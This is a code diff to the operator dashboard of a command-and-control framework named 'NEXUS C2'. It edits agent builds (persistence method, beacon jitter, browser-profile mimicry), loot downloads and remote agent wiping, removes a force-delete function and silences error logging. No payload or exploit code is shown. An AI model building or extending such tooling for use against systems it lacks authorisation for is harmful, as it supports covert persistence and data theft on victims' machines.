@@ -77,8 +77,6 @@ const interactionTitle = document.getElementById("interaction-title");
 const selectedAgentBadge = document.getElementById("selected-agent-badge");
 const taskListEl = document.getElementById("task-list");
 const refreshBtn = document.getElementById("refresh-agents");
-const persistCheckbox = document.getElementById("build-persist");
-const persistLabel = document.getElementById("persist-label");
 
 // ═══════════════════════════════════════════
 //  SECTION SWITCHING
@@ -370,7 +368,7 @@ function buildAgent(event) {
         server_url: document.getElementById("build-url").value.trim(),
         jitter_min: jitterMin,
         jitter_max: jitterMax,
-        persistence: document.getElementById("build-persist").checked,
+        persist_method: document.getElementById("build-persist-method").value,
         profile_id: parseInt(document.getElementById("build-profile").value, 10),
         locale: document.getElementById("build-locale").value.trim() || "en-US,en;q=0.9",
     };
@@ -496,7 +494,7 @@ function triggerDownload(buildId, filename) {
             document.body.removeChild(a);
             window.URL.revokeObjectURL(url);
         })
-        .catch((err) => console.error("Download failed:", err));
+        .catch(() => { });
 }
 
 function deleteBuild(buildId) {
@@ -512,7 +510,7 @@ function deleteBuild(buildId) {
 }
 
 function deleteAgent(agentId) {
-    if (!confirm("⚠ DESTROY AGENT?\n\nThis will remotely wipe the agent from the host:\n• Remove persistence (registry/cron)\n• Delete the agent binary\n• Agent will self-destruct on next check-in\n\nContinue?")) return;
+    if (!confirm("⚠ DESTROY AGENT?\n\nThis will remotely wipe the agent from the host:\n• Remove persistence (scheduled task/registry/cron/systemd)\n• Delete the agent binary\n• Agent will self-destruct on next check-in\n\nContinue?")) return;
 
     apiFetch(`/api/agents/${agentId}`, { method: "DELETE" })
         .then((res) => res.json())
@@ -536,36 +534,6 @@ function deleteAgent(agentId) {
                 `);
             }
 
-            loadStats();
-        })
-        .catch(() => { });
-}
-
-function forceDeleteAgent(agentId) {
-    apiFetch(`/api/agents/${agentId}/force`, { method: "DELETE" })
-        .then((res) => res.json())
-        .then(() => {
-            if (selectedAgentId === agentId) {
-                selectedAgentId = null;
-                commandInput.disabled = true;
-                sendBtn.disabled = true;
-                document.getElementById("send-file-btn").disabled = true;
-                commandInput.placeholder = "Enter command…";
-                interactionTitle.textContent = "Select an Agent";
-                selectedAgentBadge.classList.remove("visible");
-                terminalOutput.innerHTML = `
-                    <div class="terminal-welcome">
-                        <pre class="ascii-art">
- ╔═══════════════════════════════════════╗
- ║     N E X U S   C 2   v 2 . 0       ║
- ║     Command & Control Framework      ║
- ╚═══════════════════════════════════════╝</pre>
-                        <p class="welcome-text">Select an agent to begin issuing commands.</p>
-                    </div>
-                `;
-                taskListEl.innerHTML = `<div class="empty-state small"><p>No tasks yet</p></div>`;
-            }
-            refreshAgents();
             loadStats();
         })
         .catch(() => { });
@@ -682,7 +650,7 @@ function downloadLoot(lootId) {
             document.body.removeChild(a);
             window.URL.revokeObjectURL(url);
         })
-        .catch((err) => console.error("Loot download failed:", err));
+        .catch(() => { });
 }
 
 function deleteLoot(lootId) {
@@ -822,13 +790,6 @@ function deleteStagedFile(fileId) {
         .catch(() => { });
 }
 
-// ─── Persistence toggle label ───
-if (persistCheckbox) {
-    persistCheckbox.addEventListener("change", () => {
-        persistLabel.textContent = persistCheckbox.checked ? "Enabled" : "Disabled";
-    });
-}
-
 // ─── Auto-select browser profile when OS changes ───
 const buildOsSelect = document.getElementById("build-os");
 const buildProfileSelect = document.getElementById("build-profile");
@@ -915,13 +876,13 @@ function loadTlsStatus() {
                     </div>
                     <div class="tls-cert-row">
                         <span class="tls-cert-label">Expires</span>
-                        <span class="tls-cert-value ${expiryClass}">${expiry.toLocaleDateString()} &mdash; ${daysLeft}d remaining</span>
+                        <span class="tls-cert-value ${expiryClass}">${expiry.toLocaleDateString()}, ${daysLeft}d remaining</span>
                     </div>
                 </div>
                 <div class="tls-pin-block">
                     <span class="tls-cert-label">SPKI Pin (SHA-256)</span>
                     <code class="tls-pin-code" onclick="copyPin('${escapeHtml(c.spki_pin)}')" title="Click to copy">${escapeHtml(c.spki_pin)}</code>
-                    <span class="tls-restart-note">Click pin to copy &mdash; restart the server after any cert change</span>
+                    <span class="tls-restart-note">Click pin to copy. Restart the server after any cert change</span>
                 </div>`;
 
             document.getElementById("tls-gen-warning").classList.remove("hidden");
